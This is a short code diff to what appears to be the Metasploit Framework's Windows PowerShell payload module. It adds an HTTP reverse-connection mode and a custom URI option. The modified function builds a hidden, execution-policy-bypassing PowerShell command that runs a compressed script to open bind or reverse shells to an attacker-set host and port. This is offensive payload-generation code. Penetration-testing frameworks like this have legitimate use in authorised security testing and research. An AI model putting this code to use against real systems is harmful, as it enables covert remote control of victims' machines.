@@ -13,7 +13,7 @@ module Msf
 
 module Payload::Windows::Powershell
 
-  def generate_powershell_code(conntype)
+  def generate_powershell_code(conntype, uri)
     lport = datastore['LPORT']
     lhost = datastore['LHOST']
 
@@ -28,6 +28,8 @@ module Payload::Windows::Powershell
       script_in << "\npowerfun -Command bind"
     elsif conntype == "Reverse"
       script_in << "\npowerfun -Command reverse -Sslcon true"
+    elsif conntype == "ReverseHttp"
+      script_in << "\npowerfunhttp"
     end
 
     if datastore['LOAD_MODULES']
@@ -42,6 +44,7 @@ module Payload::Windows::Powershell
     script_in.gsub!('MODULES_REPLACE', mods)
     script_in.gsub!('LPORT_REPLACE', lport.to_s)
     script_in.gsub!('LHOST_REPLACE', lhost.to_s)
+    script_in.gsub!('CustomURI', uri.to_s)
 
     script = Rex::Powershell::Command.compress_script(script_in)
     "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"
